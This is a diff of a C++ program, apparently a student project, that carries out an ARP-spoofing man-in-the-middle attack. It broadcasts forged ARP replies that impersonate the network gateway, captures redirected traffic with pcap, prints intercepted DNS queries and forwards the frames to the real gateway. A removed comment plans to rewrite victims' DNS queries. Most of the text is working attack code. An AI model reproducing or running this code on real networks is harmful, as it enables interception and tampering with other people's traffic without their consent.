@@ -6,39 +6,10 @@
  *
  */
 
-#include <libnet.h>
 
-#include <pcap.h>
-
-#include <arpa/inet.h>
-#include <linux/kernel.h>
-#include <linux/if_arp.h>
-#include <linux/if_ether.h>
-#include <linux/if_packet.h>
-#include <sys/ioctl.h>
-#include <linux/ip.h>
-#include <linux/udp.h>
-
-#include <unistd.h>
-#include <thread>
-#include <chrono>
-#include <iostream>
-#include <string>
-#include <sstream>
-#include <csignal>
-
-libnet_t *ln;
-int sfd;
-char *errbuf;
-pcap_t *handle;
-
-char *interface_name;
-char *address;
-char *deafault_gateway_mac;
-int counter = 0;
+#include "helper.h"
 
 void spoof(const char *interface_name, char *address) {
-    // TODO sprawdzić czy to libnet_init można wyciągnąć przed while itp.
     u_int32_t target_ip_addr, zero_ip_addr;
     u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
             zero_hw_addr[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
@@ -55,72 +26,22 @@ void spoof(const char *interface_name, char *address) {
 
     libnet_autobuild_arp(
             ARPOP_REPLY,                     /* operation type       */
-            src_hw_addr->ether_addr_octet,   /* sender hardware addr */ // nasz MAC
-            (u_int8_t *) &target_ip_addr,     /* sender protocol addr */ // adres IP bramy
-            zero_hw_addr,                    /* target hardware addr */ // dowolny MAC zapytał
-            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */ // -,,-
+            src_hw_addr->ether_addr_octet,   /* sender hardware addr (attacker's mac) */
+            (u_int8_t *) &target_ip_addr,     /* sender protocol addr (gateway's ip)*/
+            zero_hw_addr,                    /* target hardware addr (any MAC asked)*/
+            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */
             ln);                             /* libnet context       */
     libnet_autobuild_ethernet(
             bcast_hw_addr,                   /* ethernet destination */
             ETHERTYPE_ARP,                   /* ethertype            */
             ln);                             /* libnet context       */
 
-    while (true) {// TODO sigint
+    while (true) {
         libnet_write(ln);
         std::chrono::seconds sec = std::chrono::seconds(1);
         std::this_thread::sleep_for(sec);
     }
 
-}
-
-std::string getMacAddress(std::string interface_name) {
-    std::stringstream mac_address;
-    unsigned char mac_array[6];
-    struct ifreq interface_struct;          // interface structure -> needed for interface identification
-    int fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));        // get socket's descriptor no
-    strncpy(interface_struct.ifr_name, interface_name.c_str(), IFNAMSIZ); // read interface name and save it to interface_struct
-    if (fd < 0) {
-        std::cerr << "Problem in socket creation\n";
-    };
-    if (ioctl(fd, SIOCGIFFLAGS, &interface_struct) == 0) {
-        if (ioctl(fd, SIOCGIFHWADDR, &interface_struct) == 0) {
-            memcpy(mac_array, interface_struct.ifr_hwaddr.sa_data, 6);
-            for (int i = 0; i < 6; i++) {
-                int j = mac_array[i];
-                mac_address << std::hex << j;
-                if (i != 5) mac_address << ":";
-            }
-        }
-    }
-    close(fd);
-    return mac_address.str();
-}
-
-std::string getIpAddress(std::string interface_name) {
-    struct ifreq interface_struct;
-    int fd = socket(AF_INET, SOCK_DGRAM, 0);
-    /* I want to get an IPv4 IP address */
-    interface_struct.ifr_addr.sa_family = AF_INET;
-    /* I want IP address attached to "eth0" */
-    strncpy(interface_struct.ifr_name, interface_name.c_str(), IFNAMSIZ - 1);
-    int ret = ioctl(fd, SIOCGIFADDR, &interface_struct);
-    if (ret != 0) {
-        std::cerr << "Error occurs when searching for an ip!\n";
-    }
-    std::string ip = inet_ntoa(((struct sockaddr_in *) &interface_struct.ifr_addr)->sin_addr);
-    close(fd);
-    return ip;
-}
-
-std::string createFilter(char *interface_name, std::string gatewayIp) {
-    std::string myMacAddress = getMacAddress(interface_name);
-    std::string myIpAddress = getIpAddress(interface_name);
-
-    std::stringstream str;
-    str << "ether dst " << myMacAddress;
-    // str << " and dst host " << ip;
-    str << " and not dst host " << myIpAddress;
-    return str.str();
 }
 
 void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
@@ -143,24 +64,28 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
 
     if (ntohs(eth_hdr->h_proto) == ETH_P_IP) {
         struct iphdr *ip_hdr = (struct iphdr *) (frame + sizeof(struct ethhdr));
+        unsigned int ip_size = ntohs(ip_hdr->tot_len);    // h->caplen - sizeof(struct ethhdr) which is 14
         if (ip_hdr->protocol == 0x11) {
             struct udphdr *udp_hdr = (struct udphdr *) (frame + sizeof(struct ethhdr) + sizeof(struct iphdr));
             uint16_t port = ntohs(udp_hdr->dest);
-            if (port == 53) { // Port 53 (DNS) TODOresult = {__be16} 0
-                printf("DUPA\n");
-//                 TODO change query from e.g. facebook.com to wp.pl
+            unsigned int udp_size = ntohs(udp_hdr->len);
+            if (port == 53) {
+                unsigned int dns_size = udp_size - sizeof(struct udphdr);
+                std::cout << "FRAME_SIZE=" << h->caplen << ", (-14)IP_SIZE=" <<
+                          ip_size << ", (-20)UDP_SIZE=" << udp_size << ", (-8)DNS_SIZE=" << dns_size << "\n";
+                printFromToInfo(eth_hdr);
+                if (dns_size > 0) {
+                    struct DNS_HEADER *dns_header = (struct DNS_HEADER *) (udp_hdr + sizeof(struct udphdr));
+                    // TODO checking DNS_header flags and questNo?
+                    char *dns_query = (char *) (frame + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct DNS_HEADER));
+                    int dns_query_size = dns_size - sizeof(struct DNS_HEADER) - sizeof(struct QUESTION);    // QUESTION = 2*2B at the end
+                    unsigned char questionedAddress[dns_query_size];
+                    strncpy(reinterpret_cast<char *>(questionedAddress), dns_query, static_cast<size_t>(dns_query_size));
+                    printf("DNS QUERY = %s\n\n", questionedAddress);
+                }
             }
         }
     }
-
-    // PRINT
-    printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int) (h->caplen),
-           eth_hdr->h_source[0], eth_hdr->h_source[1], eth_hdr->h_source[2],
-           eth_hdr->h_source[3], eth_hdr->h_source[4], eth_hdr->h_source[5]);
-    printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
-           eth_hdr->h_dest[0], eth_hdr->h_dest[1], eth_hdr->h_dest[2],
-           eth_hdr->h_dest[3], eth_hdr->h_dest[4], eth_hdr->h_dest[5]);
-    printf("\n\n");
 
     // SEND FRAME
     // Change destination address to default gateway MAC
@@ -173,8 +98,6 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
     memcpy(eth_hdr->h_source, &interface_struct.ifr_hwaddr.sa_data, ETH_ALEN);
     if (sendto(sfd_send, frame, (int) (h->caplen), 0, (struct sockaddr *) &sall_send, sizeof(struct sockaddr_ll)) < 0) {
         printf("Error while sending: %s\n", strerror(errno));
-    } else {
-        printf("%d Message sent!\n", counter++);
     }
 
     close(sfd_send);
@@ -198,13 +121,6 @@ void capture(char *interface_name, char *address, char *deafault_gateway_mac) {
         exit(EXIT_FAILURE);
     }
     pcap_loop(handle, -1, trap, NULL);        // run trap 
-}
-
-void stop(int signal) {
-    libnet_destroy(ln);
-    pcap_close(handle);
-    free(errbuf);
-    exit(EXIT_SUCCESS);
 }
 
 int main(int argc, char **argv) {
